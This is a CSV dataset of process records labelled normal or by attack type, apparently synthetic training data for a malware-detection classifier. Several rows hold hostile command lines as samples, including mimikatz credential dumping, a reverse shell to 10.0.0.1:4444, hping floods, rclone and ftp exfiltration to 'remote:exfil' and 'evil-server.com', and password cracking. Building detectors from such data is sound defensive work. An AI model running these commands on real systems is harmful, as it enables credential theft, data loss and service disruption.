process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
devenv.exe,devenv.exe,53.639129899986706,17.603421806193623,14559,7146,0,1,0,normal
tsc.exe,tsc.exe,82.83632038130872,1.9508370155195298,58657,4614,1,1,0,normal
MsMpEng.exe,MsMpEng.exe,12.945678204974902,9.302634824636144,34363,3657,1,10,0,normal
SearchIndexer.exe,SearchIndexer.exe,16.59037080040654,1.8339169126835584,48064,7093,1,15,1,normal
chrome_update.exe,chrome_update.exe --no-ui,11.882594509746571,15.751592402728626,8112,2884,0,11,0,trojan
Teams.exe,Teams.exe,16.003623342041333,11.32815829132952,16437,7925,1,12,1,normal
python3.exe,python3.exe,75.25708958843713,11.743687553354365,52553,8827,1,4,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,94.41531977158567,17.92214509925401,5552,2472,1,5,0,brute_force
msedge.exe,msedge.exe,9.942747689412295,18.965641649591642,19013,9843,0,4,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,56.274297415314166,23.849826102592736,19796,7276,0,14,0,brute_force
System,System,3.4551058404936654,0.21196881888595026,12329,518,1,3,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,65.66809895722946,19.744696934731074,15946,5614,0,1,0,ransomware
cmd.exe,cmd.exe,1.0510866749312164,1.2708123384819867,17279,5311,1,5,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,10.655834145552593,26.92553596500263,51947,3770,1,14,0,trojan
hping.exe,hping.exe --flood -p 80 target.com,90.59392043963214,12.331231390263692,24889,1590,1,1084,0,ddos
node.exe,node.exe,68.7628386779691,2.136886755771732,4188,2910,0,0,0,normal
services.exe,services.exe,0.8196233398616299,0.9379738874494181,10207,3747,0,14,0,normal
chrome.exe,chrome.exe,39.79958388687483,2.5586892629969404,8697,7795,0,10,1,normal
lsass.exe,lsass.exe,1.1302119941754025,0.20253029894044,61560,6257,1,0,0,normal
lsass.exe,lsass.exe,3.0191632877644508,0.4457464475870603,56269,1388,1,9,0,normal
explorer.exe,explorer.exe,7.1167595831822394,4.4112338363085515,64069,2641,1,3,0,normal
msedge.exe,msedge.exe,26.31520935760663,14.167053564815184,12750,2402,0,12,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,49.82416125050171,9.913853883213795,57052,2470,0,12,0,data_exfiltration
SearchIndexer.exe,SearchIndexer.exe,19.821091097540823,3.7292231731201166,51885,4023,0,7,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,24.081322350569273,10.695425080902119,25352,4838,0,6,0,data_exfiltration
dwm.exe,dwm.exe,2.8654728430316663,5.914677081981027,3098,804,1,0,1,normal
java.exe,java.exe,74.15094757979338,27.47834701940752,48579,2562,0,12,1,normal
hping.exe,hping.exe --flood -p 80 target.com,99.12868536418394,29.4583246489412,43271,5689,1,3267,0,ddos
msedge.exe,msedge.exe,17.335446284684604,24.340115910901915,31688,1521,0,8,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,42.384548144482466,12.609393048437616,40813,671,1,3,0,malware
lsass.exe,lsass.exe,3.067405764054148,1.9772537061549307,57406,1048,1,5,0,normal
